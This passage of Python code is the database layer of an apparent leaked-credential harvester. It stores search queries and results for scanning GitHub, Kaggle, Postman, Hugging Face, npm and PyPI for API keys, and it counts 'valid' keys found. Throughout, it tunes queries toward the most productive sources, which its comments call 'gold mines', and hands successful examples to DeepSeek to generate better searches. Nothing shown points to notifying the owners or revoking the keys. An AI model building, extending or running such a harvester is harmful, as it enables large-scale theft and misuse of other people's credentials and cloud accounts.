            "DELETE FROM infra_findings WHERE risk_level='low' AND discovered_at < ?",
            (cutoff,),
        )
        deleted = cur.rowcount
    if deleted:
        # Reclaim disk space after bulk delete
        with _conn() as c:
            c.execute("PRAGMA wal_checkpoint(TRUNCATE)")
    return deleted


def get_infra_since(since_iso: str) -> list[dict]:
    with _conn() as c:
        return [dict(r) for r in c.execute(
            "SELECT cred_type, COUNT(*) as cnt, "
            "SUM(CASE WHEN risk_level='high' THEN 1 ELSE 0 END) as high_cnt "
            "FROM infra_findings WHERE discovered_at > ? "
            "GROUP BY cred_type ORDER BY cnt DESC",
            (since_iso,)
        ).fetchall()]


# ── Dynamic queries (rotating combinatorial pool) ─────────────────────────

def _query_hash(query_str: str) -> str:
    """Normalize whitespace and sha256 — the dedup primitive for 15-day non-repeat."""
    norm = " ".join(query_str.split())
    return hashlib.sha256(norm.encode()).hexdigest()


def get_recent_query_hashes(days: int = 15) -> set[str]:
    """All query hashes generated within the last N days. Generator filters
    candidates against this set BEFORE attempting insert — guarantees no
    repeat within the window even if the same combinatorial cell is hit
    twice by different theme batches."""
    cutoff = (datetime.now(timezone.utc) - timedelta(days=days)).isoformat()
    with _conn() as c:
        rows = c.execute(
            "SELECT query_hash FROM dynamic_queries WHERE generated_at > ?",
            (cutoff,),
        ).fetchall()
    return {r["query_hash"] for r in rows}


def kaggle_get_recent_query_hashes(days: int = 15) -> set[str]:
    """Hashes of Kaggle dynamic queries generated within the last N days —
    used by kaggle_themer to avoid duplicate generation."""
    cutoff = (datetime.now(timezone.utc) - timedelta(days=days)).isoformat()
    with _conn() as c:
        rows = c.execute(
            "SELECT query_hash FROM kaggle_dynamic_queries WHERE generated_at > ?",
            (cutoff,),
        ).fetchall()
    return {r["query_hash"] for r in rows}


def kaggle_register_queries(items: list[dict]) -> int:
    """Bulk insert Kaggle dynamic queries. items: [{query_str, theme}].
    Returns count of NEW rows inserted (INSERT OR IGNORE on hash)."""
    if not items:
        return 0
    now = _now()
    rows = []
    for it in items:
        q = it["query_str"]
        h = _query_hash(q)
        rows.append((h, q, it.get("theme", ""), now))
    with _conn() as c:
        cur = c.executemany(
            """INSERT OR IGNORE INTO kaggle_dynamic_queries
                 (query_hash, query_str, theme, generated_at)
               VALUES (?, ?, ?, ?)""",
            rows,
        )
        return cur.rowcount


def kaggle_active_queries(limit: int = 200) -> list[str]:
    """Return up to `limit` non-blacklisted Kaggle dynamic queries, sorted
    by yield (valid+total) desc, then recency. Used by kaggle_scanner each
    cycle alongside the static _QUERIES list."""
    now = _now()
    with _conn() as c:
        rows = c.execute(
            """SELECT query_str FROM kaggle_dynamic_queries
               WHERE blacklisted_until IS NULL OR blacklisted_until < ?
               ORDER BY valid_keys_found DESC, keys_found DESC, generated_at DESC
               LIMIT ?""",
            (now, limit),
        ).fetchall()
    return [r["query_str"] for r in rows]


def kaggle_record_query_yield(query_str: str, kernels_returned: int,
                              keys_found: int, valid_keys: int):
    """Update yield counters for a Kaggle dynamic query so kaggle_themer can
    learn what works."""
    h = _query_hash(query_str)
    with _conn() as c:
        c.execute(
            """UPDATE kaggle_dynamic_queries
               SET last_used_at=?, times_used=times_used+1,
                   kernels_returned=kernels_returned+?,
                   keys_found=keys_found+?,
                   valid_keys_found=valid_keys_found+?
               WHERE query_hash=?""",
            (_now(), kernels_returned, keys_found, valid_keys, h),
        )


def register_dynamic_queries(items: list[dict]) -> int:
    """Bulk insert generated queries. items: [{query_str, provider, file_type, theme}]
    Returns count of NEW rows inserted (duplicates are silently ignored via
    INSERT OR IGNORE — caller already pre-filtered against recent hashes,
    but this is a belt-and-suspenders guard against races)."""
    if not items:
        return 0
    now = _now()
    rows = []
    for it in items:
        q  = it["query_str"]
        h  = _query_hash(q)
        rows.append((
            h, q, it["provider"], it["file_type"],
            it.get("theme", ""), now,
        ))
    with _conn() as c:
        cur = c.executemany(
            """INSERT OR IGNORE INTO dynamic_queries
                 (query_hash, query_str, provider, file_type, theme, generated_at)
               VALUES (?, ?, ?, ?, ?, ?)""",
            rows,
        )
        return cur.rowcount


def import_dynamic_queries_from_master(items: list[dict]) -> tuple[int, int]:
    """Mirror-side bulk upsert of master's dynamic_queries dump. Inserts new
    rows verbatim (preserving generated_at and blacklisted_until) and updates
    blacklisted_until on existing rows so mirror honors master's blacklist
    decisions. Yield stats (keys_found/valid_keys_found/times_used) are NOT
    overwritten on existing rows — mirror's own counters reflect mirror's
    work and shouldn't be clobbered by master's snapshot.

    Returns (n_inserted, n_blacklist_updated).
    """
    if not items:
        return 0, 0
    n_ins = n_bl = 0
    with _conn() as c:
        for it in items:
            h = it.get("query_hash") or _query_hash(it["query_str"])
            cur = c.execute(
                """INSERT OR IGNORE INTO dynamic_queries
                       (query_hash, query_str, provider, file_type, theme,
                        generated_at, blacklisted_until,
                        keys_found, valid_keys_found, times_used)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (h, it["query_str"], it["provider"], it["file_type"],
                 it.get("theme", ""), it.get("generated_at", _now()),
                 it.get("blacklisted_until"),
                 it.get("keys_found", 0), it.get("valid_keys_found", 0),
                 it.get("times_used", 0)),
            )
            if cur.rowcount:
                n_ins += 1
            else:
                # Row exists — sync blacklist decision from master only
                bl = it.get("blacklisted_until")
                if bl:
                    cur2 = c.execute(
                        """UPDATE dynamic_queries SET blacklisted_until = ?
                           WHERE query_hash = ?
                             AND (blacklisted_until IS NULL OR blacklisted_until < ?)""",
                        (bl, h, bl),
                    )
                    if cur2.rowcount:
                        n_bl += 1
    return n_ins, n_bl


def get_active_dynamic_queries(max_age_days: int = 15) -> list[dict]:
    """Return queries generated within the window AND not currently blacklisted.
    Each row carries query_hash so the scanner can call record_query_usage()
    afterwards to attribute yield. Blacklist auto-expires when blacklisted_until
    passes — we filter `>= now` so expired blacklists return to rotation."""
    cutoff = (datetime.now(timezone.utc) - timedelta(days=max_age_days)).isoformat()
    now = _now()
    with _conn() as c:
        return [dict(r) for r in c.execute(
            """SELECT query_hash, query_str, provider, file_type, theme,
                      times_used, items_returned, keys_found, valid_keys_found
               FROM dynamic_queries
               WHERE generated_at > ?
                 AND (blacklisted_until IS NULL OR blacklisted_until < ?)
               ORDER BY valid_keys_found DESC, generated_at DESC""",
            (cutoff, now),
        ).fetchall()]


def record_query_usage(query_hash: str, items_returned: int = 0,
                       keys_found: int = 0, valid_keys_found: int = 0) -> None:
    """Per-cycle counter increment. Called by scanner after each query is
    exhausted (all pages walked). Static QUERIES skip this entirely
    (their hash isn't in the table — UPDATE is a no-op)."""
    if not query_hash:
        return
    now = _now()
    with _conn() as c:
        c.execute(
            """UPDATE dynamic_queries
               SET times_used       = times_used + 1,
                   last_used_at     = ?,
                   items_returned   = items_returned + ?,
                   keys_found       = keys_found + ?,
                   valid_keys_found = valid_keys_found + ?
               WHERE query_hash = ?""",
            (now, items_returned, keys_found, valid_keys_found, query_hash),
        )


def auto_blacklist_dead_queries(min_uses: int = 3, blacklist_days: int = 30) -> int:
    """Blacklist queries that have been run >= min_uses times AND found zero
    keys. Skipped for `blacklist_days` then auto-returned to rotation by
    get_active_dynamic_queries (blacklisted_until < now).

    Threshold lowered 5→3: dead patterns waste ~3-5s per use across all
    workers. Killing them after 3 uses (vs 5) frees scan-budget by ~40%
    on long-tail garbage, redirected to yielders + newcomers."""
    cutoff = (datetime.now(timezone.utc) + timedelta(days=blacklist_days)).isoformat()
    with _conn() as c:
        cur = c.execute(
            """UPDATE dynamic_queries
               SET blacklisted_until = ?
               WHERE times_used >= ?
                 AND keys_found = 0
                 AND blacklisted_until IS NULL""",
            (cutoff, min_uses),
        )
        return cur.rowcount


def get_top_yielding_queries(provider: str, limit: int = 50) -> list[dict]:
    """Top queries by valid_keys_found for AI prompt context — gives the
    vocab expander positive examples of what works."""
    with _conn() as c:
        return [dict(r) for r in c.execute(
            """SELECT query_str, theme, times_used,
                      keys_found, valid_keys_found
               FROM dynamic_queries
               WHERE provider = ?
                 AND keys_found > 0
               ORDER BY valid_keys_found DESC, keys_found DESC
               LIMIT ?""",
            (provider, limit),
        ).fetchall()]


def get_dead_queries(provider: str, limit: int = 30) -> list[dict]:
    """Queries with >=3 uses and zero yield — negative examples for AI."""
    with _conn() as c:
        return [dict(r) for r in c.execute(
            """SELECT query_str, theme, times_used
               FROM dynamic_queries
               WHERE provider = ?
                 AND times_used >= 3
                 AND keys_found = 0
               ORDER BY times_used DESC
               LIMIT ?""",
            (provider, limit),
        ).fetchall()]


def get_dynamic_query_stats() -> dict:
    """Summary for /health and Telegram digest."""
    with _conn() as c:
        total = c.execute("SELECT COUNT(*) FROM dynamic_queries").fetchone()[0]
        active = c.execute(
            "SELECT COUNT(*) FROM dynamic_queries "
            "WHERE blacklisted_until IS NULL OR blacklisted_until < ?",
            (_now(),)
        ).fetchone()[0]
        productive = c.execute(
            "SELECT COUNT(*) FROM dynamic_queries WHERE keys_found > 0"
        ).fetchone()[0]
        valid_yielding = c.execute(
            "SELECT COUNT(*) FROM dynamic_queries WHERE valid_keys_found > 0"
        ).fetchone()[0]
        by_prov = [dict(r) for r in c.execute(
            """SELECT provider,
                      COUNT(*)              as total,
                      SUM(keys_found)       as keys,
                      SUM(valid_keys_found) as valid_keys
               FROM dynamic_queries
               GROUP BY provider
               ORDER BY valid_keys DESC, keys DESC"""
        ).fetchall()]
    return {
        "total":          total,
        "active":         active,
        "productive":     productive,
        "valid_yielding": valid_yielding,
        "by_provider":    by_prov,
    }


# ── Axis extensions (AI-discovered vocabulary) ────────────────────────────

def add_axis_extensions(provider: str, axis: str, values: list[str]) -> int:
    """Bulk insert vocabulary discoveries. axis ∈ {'env_names','filenames',
    'context_words','key_prefixes'}. Duplicates ignored. Returns inserted count."""
    if not values:
        return 0
    now = _now()
    rows = [(provider, axis, v.strip(), now) for v in values if v and v.strip()]
    if not rows:
        return 0
    with _conn() as c:
        cur = c.executemany(
            """INSERT OR IGNORE INTO axis_extensions
                 (provider, axis, value, discovered_at)
               VALUES (?, ?, ?, ?)""",
            rows,
        )
        return cur.rowcount


def get_axis_extensions(provider: str, axis: str | None = None) -> dict[str, list[str]]:
    """Return {axis: [values]} for a provider. If `axis` is given, returns
    {axis: [values]} only for that axis."""
    sql = "SELECT axis, value FROM axis_extensions WHERE provider = ?"
    args: tuple = (provider,)
    if axis:
        sql += " AND axis = ?"
        args = (provider, axis)
    out: dict[str, list[str]] = {}
    with _conn() as c:
        for r in c.execute(sql, args).fetchall():
            out.setdefault(r["axis"], []).append(r["value"])
    return out


def get_top_yielding_repos(days: int = 30, min_valid_keys: int = 3,
                             limit: int = 10) -> list[dict]:
    """Repos that leaked the most VALID keys in the last N days.

    Used by archetype_miner to identify "what kind of repos are gold mines"
    so DeepSeek can pattern-match and produce queries finding similar ones.
    Excludes URL-style/non-github repo strings (URL-shaped) and
    multi-platform prefixes (postman:/kaggle:/hf:/npm:/pypi:/cc:).
    """
    cutoff = (datetime.now(timezone.utc) - timedelta(days=days)).isoformat()
    with _conn() as c:
        return [dict(r) for r in c.execute(
            """SELECT repo,
                      COUNT(*)                  as total_keys,
                      SUM(is_valid)             as valid_keys,
                      GROUP_CONCAT(DISTINCT provider) as providers,
                      MAX(discovered_at)        as last_seen
               FROM found_keys
               WHERE discovered_at > ?
                 AND is_valid = 1
                 AND repo LIKE '%/%'
                 AND repo NOT LIKE 'http%://%'
                 AND repo NOT LIKE 'postman:%'
                 AND repo NOT LIKE 'kaggle:%'
                 AND repo NOT LIKE 'hf:%'
                 AND repo NOT LIKE 'npm:%'
                 AND repo NOT LIKE 'pypi:%'
                 AND repo NOT LIKE 'cc:%'
                 AND repo NOT LIKE 'infra_jackpot%'
               GROUP BY repo
               HAVING valid_keys >= ?
               ORDER BY valid_keys DESC, total_keys DESC
               LIMIT ?""",
            (cutoff, min_valid_keys, limit),
        ).fetchall()]


def get_recent_valid_files(provider: str, limit: int = 20) -> list[dict]:
    """Pull recent VALID-key file metadata for the AI vocab prompt — gives
    DeepSeek real-world examples to extract new var-names/filenames from.

    Returns repo + file_path + file_url so the caller can fetch raw content
    (we don't store content in DB — too bulky)."""
    with _conn() as c:
        return [dict(r) for r in c.execute(
            """SELECT repo, file_path, file_url, key_preview, discovered_at
               FROM found_keys
               WHERE provider = ?
                 AND is_valid = 1
                 AND file_url != ''
               ORDER BY discovered_at DESC
               LIMIT ?""",
            (provider, limit),
        ).fetchall()]
